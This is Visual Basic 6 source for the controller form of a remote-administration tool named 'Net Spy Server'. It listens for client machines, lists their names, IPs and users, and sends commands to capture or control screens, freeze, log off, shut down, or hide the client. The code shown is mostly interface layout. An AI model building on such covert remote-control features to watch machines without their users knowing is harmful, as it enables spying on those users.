VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0"; "MSCOMCTL.OCX"
Begin VB.Form frm_server 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Net Spy Server 1.0"
   ClientHeight    =   4620
   ClientLeft      =   150
   ClientTop       =   540
   ClientWidth     =   12735
   Icon            =   "frm_server.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   ScaleHeight     =   4620
   ScaleWidth      =   12735
   StartUpPosition =   2  'CenterScreen
   Begin MSWinsockLib.Winsock sckconnectionarray 
      Index           =   0
      Left            =   7080
      Top             =   3360
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock scklisten 
      Left            =   6600
      Top             =   3360
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.Timer tmr_autorefresh 
      Enabled         =   0   'False
      Interval        =   8000
      Left            =   6120
      Top             =   3360
   End
   Begin VB.Timer tmr_bar2 
      Enabled         =   0   'False
      Interval        =   3000
      Left            =   5640
      Top             =   3360
   End
   Begin VB.Timer tmr_bar 
      Interval        =   15
      Left            =   5160
      Top             =   3360
   End
   Begin VB.Frame Frame1 
      BackColor       =   &H80000016&
      Caption         =   "Computer Information"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H8000000D&
      Height          =   2055
      Left            =   3480
      TabIndex        =   24
      Top             =   2160
      Width           =   3495
      Begin VB.Label lbl_frame_command 
         BackColor       =   &H80000016&
         ForeColor       =   &H8000000D&
         Height          =   255
         Left            =   1680
         TabIndex        =   36
         Top             =   1680
         Width           =   1695
      End
      Begin VB.Label lbl_frame_time 
         BackColor       =   &H80000016&
         ForeColor       =   &H8000000D&
         Height          =   255
         Left            =   1680
         TabIndex        =   35
         Top             =   1320
         Width           =   1695
      End
      Begin VB.Label lbl_frame_win 
         BackColor       =   &H80000016&
         ForeColor       =   &H8000000D&
         Height          =   255
         Left            =   1560
         TabIndex        =   34
         Top             =   1080
         Width           =   1815
      End
      Begin VB.Label lbl_frame_User 
         BackColor       =   &H80000016&
         ForeColor       =   &H8000000D&
         Height          =   255
         Left            =   1320
         TabIndex        =   33
         Top             =   840
         Width           =   2055
      End
      Begin VB.Label lbl_frame_ip 
         BackColor       =   &H80000016&
         ForeColor       =   &H8000000D&
         Height          =   255
         Left            =   1080
         TabIndex        =   32
         Top             =   600
         Width           =   2295
      End
      Begin VB.Label lbl_frame_name 
         BackColor       =   &H80000016&
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H8000000D&
         Height          =   255
         Left            =   1440
         TabIndex        =   31
         Top             =   360
         Width           =   1935
      End
      Begin VB.Label Label7 
         BackColor       =   &H80000016&
         Caption         =   "Last command sent:"
         Height          =   255
         Left            =   120
         TabIndex        =   30
         Top             =   1680
         Width           =   1935
      End
      Begin VB.Label Label6 
         BackColor       =   &H80000016&
         Caption         =   "Time of connection:"
         Height          =   255
         Left            =   120
         TabIndex        =   29
         Top             =   1320
         Width           =   1455
      End
      Begin VB.Label Label5 
         BackColor       =   &H80000016&
         Caption         =   "User logged in:"
         Height          =   255
         Left            =   120
         TabIndex        =   28
         Top             =   840
         Width           =   1095
      End
      Begin VB.Label Label4 
         BackColor       =   &H80000016&
         Caption         =   "Windows Version:"
         Height          =   255
         Left            =   120
         TabIndex        =   27
         Top             =   1080
         Width           =   1455
      End
      Begin VB.Label Label3 
         BackColor       =   &H80000016&
         Caption         =   "IP Address:"
         Height          =   255
         Left            =   120
         TabIndex        =   26
         Top             =   600
         Width           =   855
      End
      Begin VB.Label Label2 
         BackColor       =   &H80000016&
         Caption         =   "Computer Name:"
         Height          =   255
         Left            =   120
         TabIndex        =   25
         Top             =   360
         Width           =   1215
      End
   End
   Begin VB.Frame Frame2 
      BackColor       =   &H80000016&
      Caption         =   "Multi-Commands"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H8000000D&
      Height          =   1695
      Left            =   3480
      TabIndex        =   39
      Top             =   360
      Width           =   3495
      Begin VB.ComboBox combo_command 
         Height          =   315
         ItemData        =   "frm_server.frx":0442
         Left            =   120
         List            =   "frm_server.frx":0461
         TabIndex        =   2
         Top             =   1200
         Width           =   1695
      End
      Begin VB.ListBox list_multi 
         Height          =   840
         ItemData        =   "frm_server.frx":04BE
         Left            =   120
         List            =   "frm_server.frx":04C0
         OLEDropMode     =   1  'Manual
         TabIndex        =   1
         Top             =   360
         Width           =   1695
      End
      Begin VB.PictureBox Picture1 
         BackColor       =   &H80000016&
         BorderStyle     =   0  'None
         Height          =   1215
         Left            =   1920
         ScaleHeight     =   1215
         ScaleWidth      =   1455
         TabIndex        =   40
         Top             =   360
         Width           =   1455
         Begin VB.CommandButton cmd_clearmulti 
            Caption         =   "Delete"
            Height          =   375
            Left            =   120
            TabIndex        =   3
            Top             =   210
            Width           =   1335
         End
         Begin VB.CommandButton Cmd_sendtoall 
            Caption         =   "Send to All"
            Default         =   -1  'True
            BeginProperty Font 
               Name            =   "MS Sans Serif"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   495
            Left            =   120
            TabIndex        =   4
            Top             =   650
            Width           =   1335
         End
      End
   End
   Begin MSComctlLib.ImageList ImageList1 
      Left            =   1440
      Top             =   3480
      _ExtentX        =   1005
      _ExtentY        =   1005
      BackColor       =   -2147483643
      ImageWidth      =   30
      ImageHeight     =   30
      MaskColor       =   16777215
      _Version        =   393216
      BeginProperty Images {2C247F25-8591-11D1-B16A-00C0F0283628} 
         NumListImages   =   7
         BeginProperty ListImage1 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frm_server.frx":04C2
            Key             =   "xp"
         EndProperty
         BeginProperty ListImage2 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frm_server.frx":0FDC
            Key             =   "2k"
         EndProperty
         BeginProperty ListImage3 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frm_server.frx":1AF6
            Key             =   "w95"
         EndProperty
         BeginProperty ListImage4 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frm_server.frx":2610
            Key             =   "w98"
         EndProperty
         BeginProperty ListImage5 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frm_server.frx":312A
            Key             =   "me"
         EndProperty
         BeginProperty ListImage6 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frm_server.frx":3C44
            Key             =   "nt3"
         EndProperty
         BeginProperty ListImage7 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frm_server.frx":475E
            Key             =   "nt4"
         EndProperty
      EndProperty
   End
   Begin MSComctlLib.ListView ListView1 
      Height          =   3855
      Left            =   1320
      TabIndex        =   0
      Top             =   360
      Width           =   1335
      _ExtentX        =   2355
      _ExtentY        =   6800
      View            =   1
      Arrange         =   2
      LabelEdit       =   1
      LabelWrap       =   -1  'True
      HideSelection   =   -1  'True
      OLEDragMode     =   1
      FlatScrollBar   =   -1  'True
      GridLines       =   -1  'True
      _Version        =   393217
      Icons           =   "ImageList1"
      SmallIcons      =   "ImageList1"
      ForeColor       =   -2147483640
      BackColor       =   16777215
      BorderStyle     =   1
      Appearance      =   1
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Arial"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      MouseIcon       =   "frm_server.frx":5278
      OLEDragMode     =   1
      NumItems        =   0
   End
   Begin VB.ListBox List1 
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   2985
      Left            =   1320
      TabIndex        =   20
      Top             =   360
      Visible         =   0   'False
      Width           =   1335
   End
   Begin VB.ListBox List5 
      Height          =   2985
      Left            =   5760
      TabIndex        =   12
      Top             =   360
      Visible         =   0   'False
      Width           =   1215
   End
   Begin VB.ListBox List4 
      Height          =   3765
      Left            =   7680
      TabIndex        =   11
      Top             =   360
      Width           =   4935
   End
   Begin VB.CommandButton cmd_sendcommand 
      Caption         =   "Send"
      Height          =   375
      Left            =   4320
      TabIndex        =   9
      Top             =   3840
      Visible         =   0   'False
      Width           =   975
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Left            =   1320
      TabIndex        =   5
      Text            =   "<command> <clientname/IP>"
      Top             =   3840
      Visible         =   0   'False
      Width           =   2775
   End
   Begin VB.ListBox List3 
      Height          =   2985
      Left            =   4320
      TabIndex        =   7
      Top             =   360
      Visible         =   0   'False
      Width           =   1455
   End
   Begin VB.ListBox List2 
      Height          =   2985
      Left            =   2640
      TabIndex        =   6
      Top             =   360
      Visible         =   0   'False
      Width           =   1695
   End
   Begin VB.ListBox List7 
      Height          =   2985
      Left            =   7200
      TabIndex        =   37
      Top             =   360
      Visible         =   0   'False
      Width           =   255
   End
   Begin VB.ListBox List6 
      Height          =   2985
      Left            =   6960
      TabIndex        =   23
      Top             =   360
      Visible         =   0   'False
      Width           =   375
   End
   Begin VB.Label Label13 
      Caption         =   "Currently connected:"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   255
      Left            =   1320
      TabIndex        =   38
      Top             =   240
      Width           =   3015
   End
   Begin VB.Image moving 
      Height          =   2325
      Left            =   285
      Picture         =   "frm_server.frx":5592
      Top             =   -2325
      Width           =   45
   End
   Begin VB.Label lbl_version 
      Alignment       =   1  'Right Justify
      BackStyle       =   0  'Transparent
      Caption         =   "v1.0"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   255
      Left            =   480
      TabIndex        =   22
      Top             =   4320
      Width           =   615
   End
   Begin VB.Image Image1 
      BorderStyle     =   1  'Fixed Single
      Height          =   5310
      Left            =   -30
      Picture         =   "frm_server.frx":5D18
      Stretch         =   -1  'True
      Top             =   -30
      Width           =   1290
   End
   Begin VB.Label refreshID 
      Caption         =   "Dummy Label"
      Height          =   375
      Left            =   7200
      TabIndex        =   21
      Top             =   1920
      Visible         =   0   'False
      Width           =   735
   End
   Begin VB.Label lbl_Capture 
      ForeColor       =   &H8000000D&
      Height          =   375
      Left            =   1320
      TabIndex        =   19
      Top             =   4250
      Width           =   5655
   End
   Begin VB.Label lbl_countusers 
      Alignment       =   1  'Right Justify
      Height          =   255
      Left            =   8400
      TabIndex        =   18
      Top             =   120
      Width           =   2655
   End
   Begin VB.Label Label12 
      Caption         =   "Log"
      Height          =   255
      Left            =   7680
      TabIndex        =   17
      Top             =   120
      Width           =   3135
   End
   Begin VB.Label Label11 
      Caption         =   "Connected at"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000000&
      Height          =   375
      Left            =   5760
      TabIndex        =   16
      Top             =   120
      Visible         =   0   'False
      Width           =   1215
   End
   Begin VB.Label Label10 
      Caption         =   "Username"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000000&
      Height          =   255
      Left            =   4320
      TabIndex        =   15
      Top             =   120
      Visible         =   0   'False
      Width           =   1455
   End
   Begin VB.Label Label9 
      Caption         =   "Client IP"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000000&
      Height          =   255
      Left            =   2640
      TabIndex        =   14
      Top             =   120
      Visible         =   0   'False
      Width           =   1695
   End
   Begin VB.Label label8 
      Caption         =   "Client Name"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000000&
      Height          =   375
      Left            =   1320
      TabIndex        =   13
      Top             =   120
      Visible         =   0   'False
      Width           =   1335
   End
   Begin VB.Label statuslbl 
      Alignment       =   1  'Right Justify
      Caption         =   "Label2"
      ForeColor       =   &H000000FF&
      Height          =   255
      Left            =   8880
      TabIndex        =   10
      Top             =   4200
      Width           =   3735
   End
   Begin VB.Label Label1 
      Caption         =   "Enter Command Below:"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000000&
      Height          =   255
      Left            =   1320
      TabIndex        =   8
      Top             =   3600
      Visible         =   0   'False
      Width           =   2295
   End
   Begin VB.Menu mnu_file 
      Caption         =   "&File"
      Index           =   0
      Begin VB.Menu mnu_file_logoff 
         Caption         =   "&Log Off"
         Index           =   4
      End
      Begin VB.Menu mnu_file_exit 
         Caption         =   "E&xit"
         Index           =   6
      End
   End
   Begin VB.Menu mnu_settings 
      Caption         =   "&Settings"
      Begin VB.Menu mnu_settings_users 
         Caption         =   "&Users"
      End
   End
   Begin VB.Menu mnu_view 
      Caption         =   "&View"
      Begin VB.Menu mnu_view_commands 
         Caption         =   "Show &Commands"
         Checked         =   -1  'True
      End
      Begin VB.Menu mnu_view_log 
         Caption         =   "Show &Log"
         Checked         =   -1  'True
      End
      Begin VB.Menu mnu_bar 
         Caption         =   "-"
      End
      Begin VB.Menu mnu_view_interface 
         Caption         =   "&Server Interface"
         Begin VB.Menu mnu_view_interface_new 
            Caption         =   "&Modern"
            Checked         =   -1  'True
         End
         Begin VB.Menu mnu_view_interface_old 
            Caption         =   "&Traditional"
            Checked         =   -1  'True
         End
      End
   End
   Begin VB.Menu mnu_help 
      Caption         =   "&About"
      Index           =   1
   End
   Begin VB.Menu mnupopup 
      Caption         =   "Popup"
      Begin VB.Menu mnupopup_commands 
         Caption         =   "Commands"
         Begin VB.Menu mnupopup_commands_capture 
            Caption         =   "Capture/Control"
            Index           =   11
         End
         Begin VB.Menu mnupopup_commands_message 
            Caption         =   "Send Message"
            Index           =   12
         End
         Begin VB.Menu mnu_popup_commands_bar1 
            Caption         =   "-"
         End
         Begin VB.Menu mnupopup_commands_freeze 
            Caption         =   "Freeze"
            Index           =   15
         End
         Begin VB.Menu mnupopup_commands_unfreeze 
            Caption         =   "Unfreeze"
            Index           =   16
         End
         Begin VB.Menu mnu_popup_commands_bar2 
            Caption         =   "-"
         End
         Begin VB.Menu mnupopup_commands_logoff 
            Caption         =   "Log off"
            Index           =   13
         End
         Begin VB.Menu mnupopup_commands_shutdown 
            Caption         =   "Shutdown"
            Index           =   14
         End
         Begin VB.Menu mnu_popup_commands_bar3 
            Caption         =   "-"
         End
         Begin VB.Menu mnupopup_commands_show 
            Caption         =   "Show Client"
            Index           =   9
         End
         Begin VB.Menu mnupopup_commands_hide 
            Caption         =   "Hide Client"
            Index           =   10
         End
         Begin VB.Menu mnupopup_commands_End 
            Caption         =   "End Client"
            Index           =   8
         End
      End
   End
End
Attribute VB_Name = "frm_server"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim freesocket As Integer

Dim holdmessage, statement As String
Dim datatype As String
Dim ipsplit, computernamesplit, usernamesplit As String
Dim iplen, namelen, usernamelen As Integer
Dim totallen As Integer
Dim inter, interno As String
Dim command, identity, Message As String
Dim commandsplitlen As Integer
Dim gotcomp As Boolean
Dim templowercase As String
'Dim doubleclick As Boolean
Dim popupclick As Boolean
Dim itemnumber As Integer
Dim TemporarySuspend As Boolean
Dim commandshort As String
Dim commandlen As Integer
Dim holdcompinfo(300) As String
Dim holdcompname(300) As String
Dim tmp, tmp2, tmp3, tmp4, tmp5, tmp6 As String
Dim buff, buff2, buff3, buff4 As String
Dim findwinversion() As String
Dim num, num2, num3, num4, num5, num6, num7 As Integer
Dim version As Integer
Dim versionstr As String
Dim indexplace As Integer
Dim newmsgbox As New frm_falsemsgbox
Dim wholefile As String
Dim filearriving As Boolean
Dim connectionalert As Boolean
Dim temporarycaption As String
Dim showinglog, logshowing, justminimised As Boolean
Dim MissCloseAfterError As Boolean

Private Sub ChangeInterface()

'If List1.ListCount = 0 Then
'Exit Sub
'End If

If mnu_view_interface_new.Checked = False Then
    ListView1.ListItems.Clear
    ListView1.Visible = False
    Frame1.Visible = False
    Frame2.Visible = False
    list_multi.Clear
    Label13.Visible = False
    lbl_frame_name.caption = ""
    lbl_frame_ip.caption = ""
    lbl_frame_User.caption = ""
    lbl_frame_time.caption = ""
    lbl_frame_command.caption = ""
    lbl_frame_win.caption = ""
    List1.Visible = True
    List2.Visible = True
    List3.Visible = True
    List5.Visible = True
    Label1.Visible = True
    Label8.Visible = True
    Label9.Visible = True
    Label10.Visible = True
    Label11.Visible = True
    Text1.Visible = True
    cmd_sendcommand.Visible = True
    Exit Sub
End If

With ListView1
    .Visible = True
    .Move 1320, 360, 2175, 3855
End With

With Frame1
    .Visible = True
    .Move 3600, 2160, 3495, 2055
End With

With Frame2
    .Visible = True
    .Move 3600, 360, 3495, 1695
End With

Label13.Visible = True

'data should stay in these lists they are only hidden.
List1.Visible = False
List2.Visible = False
List3.Visible = False
List5.Visible = False

Label1.Visible = False
Label8.Visible = False
Label9.Visible = False
Label10.Visible = False
Label11.Visible = False
Text1.Visible = False
cmd_sendcommand.Visible = False

Call RefreshListView(1)
End Sub

Private Sub RefreshListView(lastindex As Integer)

ListView1.ListItems.Clear

For a = 0 To List1.ListCount - 1
tmp = List1.List(a)
tmp2 = List2.List(a)
tmp3 = List3.List(a)
tmp4 = List5.List(a)
tmp5 = List6.List(a)
tmp6 = List7.List(a)
holdcompinfo(a) = tmp & "*" & tmp2 & "*" & tmp4 & "*" & tmp5 & "*" & tmp6 & "*" & tmp3
Next

For a = 0 To List1.ListCount - 1
'find image index (ie. winversion)
buff = CStr(holdcompinfo(a))

num = InStr(buff, "*")
num2 = num - 1

num3 = InStr(buff, "*")
buff2 = Right(buff, Len(buff) - (num3))
num4 = InStr(buff2, "*")
buff3 = Right(buff2, Len(buff2) - (num4))
num5 = InStr(buff3, "*")
buff4 = Right(buff3, Len(buff3) - (num5))
num6 = InStr(buff4, "*")

versionstr = Left(buff4, num6 - 1)

Select Case versionstr
    Case "XP"
        version = 1
    Case "2000"
        version = 2
    Case "95"
        version = 3
    Case "98"
        version = 4
    Case "Me"
        version = 5
    Case "NT351"
        version = 6
    Case "NT4"
        version = 7
End Select
holdcompname(a) = Left(holdcompinfo(a), num2)
ListView1.ListItems.Add a + 1, buff, StrConv(holdcompname(a), vbProperCase), version, version
Next

If ListView1.ListItems.Count = 0 Then
    lbl_frame_name.caption = ""
    lbl_frame_ip.caption = ""
    lbl_frame_User.caption = ""
    lbl_frame_time.caption = ""
    lbl_frame_command.caption = ""
    lbl_frame_win.caption = ""
    Exit Sub
End If

If lastindex = -1 Then 'this is necessary because if a client disconnects unexpectedly it can error as lists change spaces
Else:
ListView1.ListItems.Item(lastindex).Selected = True
End If

Call ListView1Click
End Sub
Public Sub UpdateUser()

frm_server.caption = "Net Spy" & " Logged in: " & StrConv(LoggedIn, vbProperCase)

'''Add code for the change to the program that you wish to occur when different users login.
'''The data for the changes can be stored inside the login data file.

End Sub
Private Sub cmd_clearmulti_Click()
If list_multi.ListCount = 0 Then
    Exit Sub
ElseIf list_multi.ListIndex = -1 Then   'If none is selected
    list_multi.RemoveItem (list_multi.ListCount - 1)
Else:
    list_multi.RemoveItem (list_multi.ListIndex)   'If one is selected then remove that one
End If
End Sub

Private Sub cmd_sendtoall_Click()
If combo_command.ListIndex = -1 Then
    MsgBox "Select a command first", vbCritical, "Error"
    Exit Sub
ElseIf list_multi.ListCount = 0 Then
    MsgBox "You must add connected users to the multi-command list before proceeding", vbCritical, "Error"
    Exit Sub
End If

sendtoall = True

If MsgBox("Are you sure you wish to send the following commands to each of the clients selected?" & vbCrLf & vbCrLf & _
"***" & UCase(combo_command.List(combo_command.ListIndex)) & "***", vbYesNo, "Are you sure?...") = vbNo Then
    Exit Sub
End If

If LCase(combo_command.List(combo_command.ListIndex)) = LCase("message") Then
    Message = InputBox("Type the message that you wish to send to all of the clients selected...", "Type Message")
End If

For a = 1 To list_multi.ListCount
    Call sendcommand(list_multi.List(a), combo_command.Text)
    'DoEvents
Next
sendtoall = False

End Sub

Private Sub Command1_Click()
Dim jimbopp As String
Call frm_mdicaptures.SearchForLoadedCapture("ocuk")

End Sub

Private Sub Form_Resize()

If Me.WindowState = 1 Then
    If frm_commands.Visible = True Then
        Call mnu_view_commands_Click
    End If
        
    If frm_users.Visible = True Then
        Unload frm_users
    End If
    
    justminimised = True
    temporarycaption = Me.caption
    Me.caption = "NetMan Server"


'This is rather complicated with all the boolean variables, but it was the only way i could think of making it possible
'to change the caption on minimising the form, and also keeping the caption when resizing it normally(ie. showing log)
ElseIf Me.WindowState = 0 Then

    'if resizing is just showing the log
    If (Me.Width = 12915 And logshowing = True) Or (Me.Width = 7245 And showinglog = True) Then
        justminimised = True
        showinglog = False
        logshowing = False
        Exit Sub
    ElseIf Me.Width = 12915 And justminimised = True Then
        Me.caption = temporarycaption
    ElseIf (Me.Width = 7245 And justminimised = False) Then
        temporarycaption = Me.caption
    End If
    
    Me.caption = temporarycaption
End If

End Sub

Private Sub List1_MouseUp(Button As Integer, Shift As Integer, x As Single, y As Single)
If Button = 2 Then
frm_server.PopupMenu mnupopup
End If
End Sub

Private Sub ListView1Click()
Dim Keystr, keystrtemp As String
Dim j, j2, j3, j4, j5, j6, j7, j8, j9, j10 As Integer
Dim buffer(5) As String
Dim inter, inter2, inter3, inter4 As String

    keystrtemp = ListView1.SelectedItem.Key
    Keystr = Right(keystrtemp, Len(keystrtemp))

    'comp name
    j = Len(Keystr)
    j2 = InStr(Keystr, "*")
    buffer(0) = Left(Keystr, j2 - 1)

    inter = Right(Keystr, j - Len(buffer(0)) - 1)

    'IP add
    j3 = InStr(inter, "*")
    buffer(1) = Left(inter, j3 - 1)

    inter2 = Right(inter, Len(inter) - j3)

    'connection time
    j4 = InStr(inter2, "*")
    buffer(4) = Left(inter2, j4 - 1)

    inter3 = Right(inter2, Len(inter2) - j4)

    'win version
    j5 = InStr(inter3, "*")
    buffer(3) = Left(inter3, j5 - 1)

    inter4 = Right(inter3, Len(inter3) - j5)
    
    'lastcommand
    j6 = InStr(inter4, "*")
    buffer(5) = Left(inter4, j6 - 1)
    
    'username
    j7 = Len(inter4) - j6
    buffer(2) = Right(inter4, j7)

    lbl_frame_name.caption = StrConv(buffer(0), vbProperCase)
    lbl_frame_ip.caption = buffer(1)
    lbl_frame_User.caption = buffer(2)
    lbl_frame_time.caption = buffer(4)
    lbl_frame_command.caption = buffer(5)
    
    'lbl_frame_win:
    Select Case buffer(3)
        Case "XP"
            lbl_frame_win.caption = "Windows XP"
        Case "2000"
            lbl_frame_win.caption = "Windows 2000"
        Case "Me"
            lbl_frame_win.caption = "Windows Me"
        Case "98"
            lbl_frame_win.caption = "Windows 98"
        Case "95"
            lbl_frame_win.caption = "Windows 95"
        Case "NT351"
            lbl_frame_win.caption = "Windows NT 3.51"
        Case "NT4"
            lbl_frame_win.caption = "Windows NT 4.0"
    End Select
    
If buffer(5) = "endclient" Then
    If ListView1.ListItems.Count > 0 Then
        ListView1.ListItems.Item(1).Selected = True
    End If
    
    lbl_frame_name.caption = ""
    lbl_frame_ip.caption = ""
    lbl_frame_User.caption = ""
    lbl_frame_time.caption = ""
    lbl_frame_command.caption = ""
    lbl_frame_win.caption = ""
End If
    
End Sub

Private Sub list_multi_OLEDragDrop(Data As DataObject, Effect As Long, Button As Integer, Shift As Integer, x As Single, y As Single)
For a = 0 To list_multi.ListCount - 1
    If list_multi.List(a) = ListView1.SelectedItem.Text Then
        Exit Sub
    End If
Next
list_multi.AddItem ListView1.SelectedItem.Text

End Sub
Private Sub ListView1_DblClick()
For a = 0 To list_multi.ListCount - 1
    If list_multi.List(a) = ListView1.SelectedItem.Text Then
        Exit Sub
    End If
Next
list_multi.AddItem ListView1.SelectedItem.Text
End Sub

Private Sub Listview1_MouseUp(Button As Integer, Shift As Integer, x As Single, y As Single)
If Button = 2 And ListView1.ListItems.Count <> 0 Then
    Call ListView1Click
    indexplace = ListView1.SelectedItem.Index
    frm_server.PopupMenu mnupopup
ElseIf Button = 1 And ListView1.ListItems.Count <> 0 Then
    Call ListView1Click
    End If
End Sub

Private Sub mnu_settings_config_Click()
MsgBox ("add config code")

End Sub

Private Sub mnu_view_interface_new_Click()
If mnu_view_interface_new.Checked = True Then
mnu_view_interface_new.Checked = False
mnu_view_interface_old.Checked = True
ElseIf mnu_view_interface_new.Checked = False Then
mnu_view_interface_new.Checked = True
mnu_view_interface_old.Checked = False
End If
Call ChangeInterface
End Sub

Private Sub mnu_view_interface_old_Click()
If mnu_view_interface_old.Checked = True Then
mnu_view_interface_old.Checked = False
mnu_view_interface_new.Checked = True
ElseIf mnu_view_interface_old.Checked = False Then
mnu_view_interface_old.Checked = True
mnu_view_interface_new.Checked = False
End If
Call ChangeInterface
End Sub

Private Sub mnu_view_log_Click()

If mnu_view_log.Checked = False Then
    logshowing = True
    Me.Width = 12915
    mnu_view_log.Checked = True

ElseIf mnu_view_log.Checked = True Then
    showinglog = True
    Me.Width = 7245
    mnu_view_log.Checked = False
End If
End Sub

Private Sub Form_Load()
Me.Move 0, 0
Me.Height = 5280
Me.Width = 7245
lbl_version.caption = "v" & App.Major & "." & App.Minor

UpdateUser

mnupopup.Visible = False
mnu_view_commands.Checked = False
mnu_view_log.Checked = False

autorefresh = False ' for the automatic refreshing of screenshots
stopautorefresh = False

scklisten.LocalPort = "1000"
scklisten.Listen
'doubleclick = False
popupclick = False
TemporarySuspend = False
refreshed = False
capturemessage = False
ControlClient = False
controlrefresh = False
connectionalert = False
AutoDoEvents = False
showinglog = False
logshowing = False
justminimised = False
indexplace = 1

statuslbl.caption = "Listening for clients..."
List4.AddItem (statuslbl.caption)
Scrolllog

tmr_bar.Enabled = True
moving.Top = -2325

mnu_view_interface_old.Checked = False
mnu_view_interface_new.Checked = True

With ListView1
    .Visible = True
    .Move 1320, 360, 2175, 3855
End With

With Frame1
    .Visible = True
    .Move 3600, 2160, 3495, 2055
End With

With Frame2
    .Visible = True
    .Move 3600, 360, 3495, 1695
End With

With Label13
    .Visible = True
    .Move 1320, 120, 3015, 255
End With

End Sub

Private Sub Form_Unload(Cancel As Integer)
If ResetAllUsers = False Then
    If frm_mdicaptures.Visible = True Then Unload frm_mdicaptures
    DoEvents
    End
Else:
    ResetAllUsers = False
End If
End Sub

Private Sub List1_Click()
Call selectlists(List1.ListIndex)
End Sub
Private Sub List2_Click()
Call selectlists(List2.ListIndex)
End Sub
Private Sub List3_Click()
Call selectlists(List3.ListIndex)
End Sub
Private Sub List5_Click()
Call selectlists(List5.ListIndex)
End Sub
Private Function selectlists(itemnumber As Integer)
List1.Selected(itemnumber) = True
List2.Selected(itemnumber) = True
List3.Selected(itemnumber) = True
List5.Selected(itemnumber) = True
End Function

Private Sub mnu_file_exit_Click(Index As Integer)
End
End Sub

Private Sub mnu_file_logoff_Click(Index As Integer)
Unload frm_useredit               '
Unload frm_users                  '
Unload frm_mdicaptures            'these are ok to hide as have no "damaging" routines on their loading
Unload frm_commands               '
Unload frm_about                  '

'unloading main form = END (so dont!)
Me.Hide
frm_passwordscreen.txt_user.Text = ""
frm_passwordscreen.txt_password.Text = ""
frm_passwordscreen.Show 1
End Sub

Private Sub mnu_settings_users_Click()
frm_users.Show
End Sub
Private Sub mnu_help_Click(Index As Integer)
frm_about.Show
End Sub

Private Sub mnupopup_commands_capture_Click(Index As Integer)
Call popup("capture")
End Sub
Private Sub mnupopup_commands_End_Click(Index As Integer)
If MsgBox("Warning, this will end the NetMan client on the remote machine, terminating your control over it.", vbOKCancel, "Warning") = vbOK Then
Call popup("endclient")
End If
End Sub
Private Sub mnupopup_commands_freeze_Click(Index As Integer)
Call popup("freeze")
End Sub
Private Sub mnupopup_commands_hide_Click(Index As Integer)
Call popup("hideclient")
End Sub
Private Sub mnupopup_commands_logoff_Click(Index As Integer)
If MsgBox("Warning, this will end the NetMan client on the remote machine before it Logs off, terminating your control over it.", vbOKCancel, "Warning") = vbOK Then
Call popup("logoff")
End If
End Sub
Private Sub mnupopup_commands_message_Click(Index As Integer)
Call popup("message")
End Sub
